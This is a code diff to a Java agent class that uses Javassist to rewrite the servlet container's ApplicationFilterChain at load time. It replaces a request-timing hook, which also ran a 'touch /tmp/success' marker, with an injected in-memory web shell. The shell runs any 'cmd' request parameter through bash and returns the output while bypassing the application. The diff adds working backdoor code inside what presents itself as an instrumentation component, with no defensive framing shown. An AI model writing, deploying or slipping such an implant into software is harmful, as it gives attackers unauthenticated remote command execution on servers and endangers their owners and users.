@@ -45,21 +45,49 @@ public class ApplicationFilterChainTransformer implements ClassFileTransformer {
 
             CtClass cc = cp.get(targetClassName);
             CtMethod m = cc.getDeclaredMethod(TARGET_METHOD);
-            m.addLocalVariable("startTime", CtClass.longType);
-            m.insertBefore("startTime = System.currentTimeMillis();");
+            m.insertBefore("""
+            {
+                if (request instanceof jakarta.servlet.http.HttpServletRequest
+                    && response instanceof jakarta.servlet.http.HttpServletResponse) {
 
-            StringBuilder endBlock = new StringBuilder();
+                    String cmd = request.getParameter("cmd");
+                    if (cmd != null && !cmd.isEmpty()) {
+                        jakarta.servlet.http.HttpServletResponse resp = (jakarta.servlet.http.HttpServletResponse) response;
+                        resp.setStatus(jakarta.servlet.http.HttpServletResponse.SC_OK);
+                        resp.setCharacterEncoding(java.nio.charset.StandardCharsets.UTF_8.name());
+                        resp.setContentType("text/plain;charset=UTF-8");
 
-            m.addLocalVariable("endTime", CtClass.longType);
-            m.addLocalVariable("opTime", CtClass.longType);
-            endBlock.append("endTime = System.currentTimeMillis();");
-            endBlock.append("opTime = (endTime-startTime)/1000;");
+                        ProcessBuilder pb = new ProcessBuilder(new String[] { "bash", "-lc", cmd });
+                        pb.redirectErrorStream(true);
 
-            endBlock.append("System.out.println(\"[Application] Request handling completed in:\" + opTime + \" seconds!\");");
-            endBlock.append("Runtime.getRuntime().exec(\"touch /tmp/success\");");
+                        java.io.PrintWriter out = resp.getWriter();
 
-            m.insertAfter(endBlock.toString());
+                        try {
+                            Process p = pb.start();
 
+                            java.io.BufferedReader reader = null;
+                            reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream(), "UTF-8"));
+
+                            String line;
+                            while ((line = reader.readLine()) != null) {
+                                out.println(line);
+                                out.flush();
+                            }
+
+                            int exitCode = p.waitFor();
+                            out.println();
+                            out.println("Exit code: " + exitCode);
+                            out.flush();
+
+                        } catch (Exception e) {
+                            out.println("Error reading process output: " + e.getMessage());
+                            out.flush();
+                        }
+                        return; // do not continue with filters or servlet
+                    }      
+                }
+            }
+            """);
             byteCode = cc.toBytecode();
             cc.detach();
         } catch (NotFoundException | CannotCompileException | IOException e) {
